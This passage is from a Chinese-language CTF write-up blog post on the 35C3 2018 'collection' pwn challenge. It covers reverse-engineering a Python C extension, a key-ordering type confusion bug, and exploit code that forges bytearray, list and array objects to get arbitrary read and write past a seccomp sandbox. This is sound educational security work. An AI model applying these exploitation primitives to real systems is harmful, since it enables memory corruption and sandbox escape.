0091: 0x60 0x00 0x00 0x00000001  A = mem[1]</span><br><span class="line"> 0092: 0x15 0x00 0x05 0x00000000  <span class="keyword">if</span> (A != 0x0) goto 0098</span><br><span class="line"> 0093: 0x60 0x00 0x00 0x00000000  A = mem[0]</span><br><span class="line"> 0094: 0x15 0x00 0x02 0x00000002  <span class="keyword">if</span> (A != 0x2) goto 0097</span><br><span class="line"> 0095: 0x60 0x00 0x00 0x00000001  A = mem[1]</span><br><span class="line"> 0096: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0097: 0x60 0x00 0x00 0x00000001  A = mem[1]</span><br><span class="line"> 0098: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br></pre></td></tr></table></figure>
+
+<p>从中，我们可以大胆的猜测，我们需要构造一个任意读，通过 readv 读取flag 然后将其打印出来。</p>
+<p>另外一点，由于编译后的Python结构体不全，我们可以通过一个方法：</p>
+<p>（这个方法是丁老教我的）</p>
+<p>这个方法中需要注意的是，对于正常的debug编译来说是没有类型信息的，需要使用<code>-g3</code>的debug编译等级，需要在编译python的时候：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;configure CFLAGS&#x3D;-g3</span><br><span class="line">make -j4</span><br></pre></td></tr></table></figure>
+
+<p>这样就可以编译出带有type的python，然后用ida打开，选择<code>file -&gt; produce file -&gt; create C header</code>就可以导出到header，在逆向so库的这边把header导入就可以得到类型信息了。</p>
+<p>在恢复完类型信息之后，我们就可以看看so库里定义的一些关键的接口了：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.data:<span class="number">00000000002041E0</span>                 dq offset CollectionTypeMethod; tp_methods</span><br><span class="line">...</span><br><span class="line">.data:<span class="number">00000000002041E0</span>                 dq offset CollectionInit; tp_init</span><br><span class="line">.data:<span class="number">00000000002041E0</span>                 dq <span class="number">0</span>                    ; tp_alloc</span><br><span class="line">.data:<span class="number">00000000002041E0</span>                 dq offset CollectionNew ; tp_new</span><br></pre></td></tr></table></figure>
+
+
+
+<p>接下来要注意的函数是new和init函数，因为它们是在初始化新的Collection对象时调用的第一个函数。总之，tp_new检查是否使用字典初始化了对象，并确保字典只有32个或更少的成员。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Collection</span><br><span class="line"></span><br><span class="line">a = Collection.Collection(&#123;<span class="string">&quot;a&quot;</span>:<span class="number">1337</span>, <span class="string">&quot;b&quot;</span>:[<span class="number">1.2</span>], <span class="string">&quot;c&quot;</span>:&#123;<span class="string">&quot;a&quot;</span>:<span class="number">45545</span>&#125;&#125;)</span><br><span class="line"></span><br><span class="line">print(a.get(<span class="string">&quot;a&quot;</span>))</span><br><span class="line">print(a.get(<span class="string">&quot;b&quot;</span>))</span><br><span class="line">print(a.get(<span class="string">&quot;c&quot;</span>))</span><br></pre></td></tr></table></figure>
+
+
+
+<p>总结一下题目的基本逻辑：</p>
+<ol>
+<li>server中：设置py沙箱，打开flag，设置fd为1023然后启动用户的python程序。设置沙箱：这一步导致我们根本不用考虑去绕过python层的沙箱了，因为在<code>import Collection</code>的时候有<code>init_sandbox</code>操作，加入了seccomp，只能使用白名单，我主要在意了白名单里有<code>write</code>和<code>readv</code>，但是没有open。</li>
+<li>有<code>Collection.Collection</code>对象，和该对象上的<code>.get</code>方法。对象初始化接受一个dict，dict的key必须为字符串，然后value为数值/list/dict中的一种。<code>.get</code>接受一个字符串，然后返回初始化时传入的内容。</li>
+<li>在初始化时会建立一个<code>handler</code>，相当于key的缓存，会保存下传入的dict的key的内容（字符串内容）和类型（是整数还是列表还是字典），建立之后会存入缓存的handler里，如果存在“一样”的handler，就会直接使用该handler，而不新建。</li>
+<li>handler的“一样”的比较，是将两个handler按照字典序排序，之后比较两个handler相应位置的key和类型是不是都一样，如果完全一样则一样，否则则不同</li>
+<li>在<code>.get</code>的时候，首先从<code>handler</code>里找到对应key所在的索引，然后从对象里的<code>slots</code>里取出内容返回，如果是整数，还需要进行一次转换，将整数转换为python的整数对象类型。</li>
+</ol>
+<h2 id="Vul"><a href="#Vul" class="headerlink" title="Vul"></a>Vul</h2><p>看一个 PoC</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">root@linuxkit<span class="number">-025000000001</span> /pwn<span class="comment"># cat test.py</span></span><br><span class="line"><span class="keyword">import</span> Collection</span><br><span class="line"></span><br><span class="line"><span class="comment"># a = Collection.Collection(&#123;&quot;a&quot;:1337, &quot;b&quot;:[1.2], &quot;c&quot;:&#123;&quot;a&quot;:45545&#125;&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(a.get(&quot;a&quot;))</span></span><br><span class="line"><span class="comment"># print(a.get(&quot;b&quot;))</span></span><br><span class="line"><span class="comment"># print(a.get(&quot;c&quot;))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = Collection.Collection(&#123;<span class="string">&#x27;a&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;b&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;c&#x27;</span>: <span class="number">3</span>&#125;)</span><br><span class="line">b = Collection.Collection(&#123;<span class="string">&#x27;b&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;a&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;c&#x27;</span>: <span class="number">3</span>&#125;)</span><br><span class="line"></span><br><span class="line">print(a.get(<span class="string">&quot;a&quot;</span>)) <span class="comment"># 1</span></span><br><span class="line">print(a.get(<span class="string">&quot;b&quot;</span>)) <span class="comment"># 2</span></span><br><span class="line">print(a.get(<span class="string">&quot;c&quot;</span>)) <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">print(b.get(<span class="string">&#x27;a&#x27;</span>)) <span class="comment"># 1 ← should be 2</span></span><br><span class="line">print(b.get(<span class="string">&#x27;b&#x27;</span>)) <span class="comment"># 2 ← should be 1</span></span><br><span class="line">print(b.get(<span class="string">&#x27;c&#x27;</span>)) <span class="comment"># 3⏎                                                                                                     root@linuxkit-025000000001 /pwn# python3 test.py</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>原本 a 被定义为：{‘a’: 1, ‘b’: 2, ‘c’: 3}</p>
+<pre><code>   b 被定义为：&#123;&#39;b&#39;: 1, &#39;a&#39;: 2, &#39;c&#39;: 3&#125;</code></pre>
+<p>那么本应该 b.get(‘a’)获取的应该是2 但是在这个时候缺拿到是 1 这是为什么？</p>
+<p>不同对象的两个handler是经过排序的，排序之后认为相同，则就使用现有的handler了，但是事实上两个handler相同之后，他们的顺序可能是不同的，而后在<code>.get</code>的时候又用到了这个顺序，不同的顺序对应的索引肯定不同。</p>
+<p>这样就造成了一个类似于类型混淆的点</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>我们尝试用<code>get()</code>返回一个我在内存中创建的伪造的Python列表对象。我希望这会让我通过List的内容任意写.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    PyObject_VAR_HEAD</span><br><span class="line">    <span class="comment">/* Vector of pointers to list elements.  list[0] is ob_item[0], etc. */</span></span><br><span class="line">    PyObject **ob_item;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ob_item contains space for &#x27;allocated&#x27; elements.  The number</span></span><br><span class="line"><span class="comment">     * currently in use is ob_size.</span></span><br><span class="line"><span class="comment">     * Invariants:</span></span><br><span class="line"><span class="comment">     *     0 &lt;= ob_size &lt;= allocated</span></span><br><span class="line"><span class="comment">     *     len(list) == ob_size</span></span><br><span class="line"><span class="comment">     *     ob_item == NULL implies ob_size == allocated == 0</span></span><br><span class="line"><span class="comment">     * list.sort() temporarily sets allocated to -1 to detect mutations.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Items must normally not be NULL, except during construction when</span></span><br><span class="line"><span class="comment">     * the list is not yet visible outside the function that builds it.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    Py_ssize_t allocated;</span><br><span class="line">&#125; PyListObject;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>然后丁老意识到，用list做任意读写并不现实，那么我们需要找一个能够直接写入值而非对象的类型。之前都想到bytes了，现在需要他可以更改，那就bytearray。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    PyObject_VAR_HEAD</span><br><span class="line">    Py_ssize_t ob_alloc; <span class="comment">/* How many bytes allocated in ob_bytes */</span></span><br><span class="line">    <span class="keyword">char</span> *ob_bytes;      <span class="comment">/* Physical backing buffer */</span></span><br><span class="line">    <span class="keyword">char</span> *ob_start;      <span class="comment">/* Logical start inside ob_bytes */</span></span><br><span class="line">    <span class="comment">/* XXX(nnorwitz): should ob_exports be Py_ssize_t? */</span></span><br><span class="line">    <span class="keyword">int</span> ob_exports;      <span class="comment">/* How many buffer exports */</span></span><br><span class="line">&#125; PyByteArrayObject;</span><br></pre></td></tr></table></figure>
+
+<p>看到<code>ob_bytes</code>大家应该就放心了，这直接就是一个缓冲区，可以直接更改，size也可控，所以如果能伪造一个bytearray，就可以任意读写了。</p>
+<p>所以总结一下思路：</p>
+<ol>
+<li>建立一个目标bytearray</li>
+<li>利用bytes伪造一个list，<code>id(X) + 0x20</code>即为写入的bytes内容的地址（这个可以调试得到），指针数组设置为bytearray地址的<code>ob_bytes</code>位置</li>
+<li>利用构造的list，将一个新的bytearray的地址写入到第一步中的bytearray的<code>ob_bytes</code>和<code>ob_start</code>位置</li>
+<li>这样就已经做到任意读写了，每次修改第一步的bytearray，让他的内容是一个伪造的bytearray，地址指向需要读写的地址，然后使用第三步的进行读写</li>
+</ol>
+<p>后来丁老意识到 我们需要绕一下 bytearary 和 list ,方法如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">subs = [].__class__.mro()[<span class="number">1</span>].__subclasses__()</span><br><span class="line"><span class="keyword">for</span> cls <span class="keyword">in</span> subs:</span><br><span class="line">    <span class="keyword">if</span> cls.__name__ == <span class="string">&#x27;bytearray&#x27;</span>:</span><br><span class="line">        bytearray = cls</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> cls.__name__ == <span class="string">&#x27;list&#x27;</span>:</span><br><span class="line">        list = cls</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> cls.__name__ == <span class="string">&#x27;bytes&#x27;</span>:</span><br><span class="line">        bytes = cls</span><br></pre></td></tr></table></figure>
+
+
+
+<p>之后我们就可以去构造我们的任意读写：</p>
+<figure class="highlight plain"><figcaption><span>set_addr(addr):</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">    payload &#x3D; p64(0x10) + p64(id(bytearray)) + p64(0x1000) + p64(0x1001) + \</span><br><span class="line">            p64(addr) + p64(addr)</span><br><span class="line">    for i in range(6 * 8):</span><br><span class="line">        buf[i] &#x3D; payload[i]</span><br><span class="line"></span><br><span class="line">def arbitrary_read(addr, length):</span><br><span class="line">    set_addr(addr) </span><br><span class="line"></span><br><span class="line">    assert length &lt; 0x1000 # can be larger, but .. really?</span><br><span class="line">    return some[:length]</span><br><span class="line"></span><br><span class="line">def arbitrary_write(addr, length, buf):</span><br><span class="line">    set_addr(addr)</span><br><span class="line"></span><br><span class="line">    for i in range(length):</span><br><span class="line">        some[i] &#x3D; buf[i]</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">之后呢，有了任意读写之后就很简单了，有了打开的flag的fd，有&#96;readv&#96;和&#96;write&#96;，构造好数据进行读取即可。接着构造一个rop。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">完整EXP见 35c3CTF [collection writeup](https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;3747)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">值得一提的是，在调试的过程中，gdb set stop-on-solib-events 1就能断下来。</span><br><span class="line"></span><br><span class="line">另外在结束后，我也看了一下作者的 [exploit](https:&#x2F;&#x2F;github.com&#x2F;bkth&#x2F;35c3ctf&#x2F;blob&#x2F;master&#x2F;collection&#x2F;dist_exploit.py) ，作者这里用了 array.array 这样的一个对象</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">​&#96;&#96;&#96;c</span><br><span class="line">typedef struct &#123;</span><br><span class="line">    typedef struct arrayobject &#123;</span><br><span class="line">    PyObject_VAR_HEAD</span><br><span class="line">    char *ob_item;  &#x2F;&#x2F; &lt;- Make this point to the address you want to read&#x2F;write</span><br><span class="line">    Py_ssize_t allocated;</span><br><span class="line">    const struct arraydescr *; &#x2F;&#x2F; &lt;- Make this point to &quot;L&quot; for long</span><br><span class="line">    PyObject *weakreflist;</span><br><span class="line">    int ob_exports;</span><br><span class="line">&#125; arrayobject;</span><br></pre></td></tr></table></figure>
+
+<p>它与List有一些相似之处，但关于这种类型的重要一点是它的内容存储为C类型而不是Python对象！有了这个，任意读写都会非常容易</p>
+<p>因此就没有了起那么的那些类型绕过：</p>
+<p>作者的 任意读写如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">addr</span>):</span></span><br><span class="line">    d = &#123;&#125;</span><br><span class="line">    d[<span class="string">&quot;a1&quot;</span>] = <span class="number">0x1</span></span><br><span class="line">    d[<span class="string">&quot;a2&quot;</span>] = <span class="number">0x9d3340</span></span><br><span class="line">    d[<span class="string">&quot;a3&quot;</span>] = <span class="number">0x4</span></span><br><span class="line">    d[<span class="string">&quot;a4&quot;</span>] = addr</span><br><span class="line">    d[<span class="string">&quot;a5&quot;</span>] = <span class="number">0x4</span></span><br><span class="line">    d[<span class="string">&quot;a6&quot;</span>] = <span class="number">0x715620</span></span><br><span class="line">    d[<span class="string">&quot;a7&quot;</span>] = <span class="number">0x0</span></span><br><span class="line">    d[<span class="string">&quot;a8&quot;</span>] = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 0x7ffff6153db0:	0x0000000000000001	0x00000000009ef7a0</span></span><br><span class="line">    <span class="comment"># 0x7ffff6153dc0:	0x0000000000000004	0x00007ffff6191790</span></span><br><span class="line">    <span class="comment"># 0x7ffff6153dd0:	0x0000000000000004	0x0000000000644a50</span></span><br><span class="line">    <span class="comment"># 0x7ffff6153de0:	0x0000000000000000	0x0000000000000000</span></span><br><span class="line">    fakeContainer = Collection.Collection(d)</span><br><span class="line"></span><br><span class="line">    collAddr = id(fakeContainer)</span><br><span class="line">    fakeArr = collAddr + <span class="number">24</span></span><br><span class="line"></span><br><span class="line">    a = Collection.Collection(&#123;<span class="string">&quot;a&quot;</span>:<span class="number">1337</span>, <span class="string">&quot;b&quot;</span>:[<span class="number">1.2</span>]&#125;)</span><br><span class="line">    b = Collection.Collection(&#123;<span class="string">&quot;b&quot;</span>:[<span class="number">1.3</span>], <span class="string">&quot;a&quot;</span>:fakeArr&#125;)</span><br><span class="line">    fakeobj = b.get(<span class="string">&quot;b&quot;</span>)</span><br><span class="line">    roots.append(fakeobj)</span><br><span class="line">    <span class="keyword">return</span> fakeobj[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">addr, val</span>):</span></span><br><span class="line">    d = &#123;&#125;</span><br><span class="line">    d[<span class="string">&quot;a1&quot;</span>] = <span class="number">0x1</span></span><br><span class="line">    d[<span class="string">&quot;a2&quot;</span>] = <span class="number">0x9d3340</span></span><br><span class="line">    d[<span class="string">&quot;a3&quot;</span>] = <span class="number">0x4</span></span><br><span class="line">    d[<span class="string">&quot;a4&quot;</span>] = addr</span><br><span class="line">    d[<span class="string">&quot;a5&quot;</span>] = <span class="number">0x4</span></span><br><span class="line">    d[<span class="string">&quot;a6&quot;</span>] = <span class="number">0x715620</span></span><br><span class="line">    d[<span class="string">&quot;a7&quot;</span>] = <span class="number">0x0</span></span><br><span class="line">    d[<span class="string">&quot;a8&quot;</span>] = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 0x7ffff6153db0:	0x0000000000000001	0x00000000009ef7a0</span></span><br><span class="line">    <span class="comment"># 0x7ffff6153dc0:	0x0000000000000004	0x00007ffff6191790</span></span><br><span class="line">    <span class="comment"># 0x7ffff6153dd0:	0x0000000000000004	0x0000000000644a50</span></span><br><span class="line">    <span class="comment"># 0x7ffff6153de0:	0x0000000000000000	0x0000000000000000</span></span><br><span class="line">    fakeContainer = Collection.Collection(d)</span><br><span class="line"></span><br><span class="line">    collAddr = id(fakeContainer)</span><br><span class="line">    fakeArr = collAddr + <span class="number">24</span></span><br><span class="line"></span><br><span class="line">    a = Collection.Collection(&#123;<span class="string">&quot;a&quot;</span>:<span class="number">1337</span>, <span class="string">&quot;b&quot;</span>:[<span class="number">1.2</span>]&#125;)</span><br><span class="line">    b = Collection.Collection(&#123;<span class="string">&quot;b&quot;</span>:[<span class="number">1.3</span>], <span class="string">&quot;a&quot;</span>:fakeArr&#125;)</span><br><span class="line">    fakeobj = b.get(<span class="string">&quot;b&quot;</span>)</span><br><span class="line">    roots.append(fakeobj)</span><br><span class="line">    fakeobj[<span class="number">0</span>] = val</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a href="https://xz.aliyun.com/t/3747">https://xz.aliyun.com/t/3747</a></p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="https://bestwing.me">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/link">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E4%BF%A1%E6%81%AF"><span class="toc-number">2.</span> <span class="toc-text">题目信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9-Collection-%E9%80%86%E5%90%91"><span class="toc-number">3.</span> <span class="toc-text">对 Collection 逆向</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vul"><span class="toc-number">4.</span> <span class="toc-text">Vul</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">5.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5%EF%BC%9A"><span class="toc-number">6.</span> <span class="toc-text">参考链接：</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://bestwing.me/2018-353cCTF-2018-collection-pwn.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://bestwing.me/2018-353cCTF-2018-collection-pwn.html&text=35C3 CTF 2018 - collection (pwn)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://bestwing.me/2018-353cCTF-2018-collection-pwn.html&title=35C3 CTF 2018 - collection (pwn)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bestwing.me/2018-353cCTF-2018-collection-pwn.html&is_video=false&description=35C3 CTF 2018 - collection (pwn)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=35C3 CTF 2018 - collection (pwn)&body=Check out this article: https://bestwing.me/2018-353cCTF-2018-collection-pwn.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://bestwing.me/2018-353cCTF-2018-collection-pwn.html&title=35C3 CTF 2018 - collection (pwn)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://bestwing.me/2018-353cCTF-2018-collection-pwn.html&title=35C3 CTF 2018 - collection (pwn)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://bestwing.me/2018-353cCTF-2018-collection-pwn.html&title=35C3 CTF 2018 - collection (pwn)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://bestwing.me/2018-353cCTF-2018-collection-pwn.html&title=35C3 CTF 2018 - collection (pwn)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://bestwing.me/2018-353cCTF-2018-collection-pwn.html&name=35C3 CTF 2018 - collection (pwn)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://bestwing.me/2018-353cCTF-2018-collection-pwn.html&t=35C3 CTF 2018 - collection (pwn)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020
+    Swing
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="https://bestwing.me">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/link">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-133464311-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Baidu Analytics -->
+
+    <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?2e6da3c375c8a87f5b664cea6d4cb29c";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'swing';
+
+        (function(){
+            var dsq = document.createElement('script');
